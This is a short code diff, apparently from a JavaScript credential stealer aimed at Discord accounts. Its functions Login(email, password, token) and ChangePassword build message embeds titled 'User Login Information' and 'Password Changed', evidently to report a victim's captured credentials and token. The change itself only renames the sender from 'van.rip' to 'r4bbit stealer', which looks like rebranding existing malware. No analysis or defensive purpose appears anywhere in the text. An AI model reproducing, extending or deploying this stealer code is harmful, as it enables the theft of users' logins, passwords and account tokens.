@@ -453,7 +453,7 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "van.rip",
+								username: "r4bbit stealer",
 								content: "",
 								embeds: [{
 									"title": "User Login Information",
@@ -796,7 +796,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "van.rip",
+								username: "r4bbit stealer",
 								content: "",
 								embeds: [{
 									"title": "Password Changed",
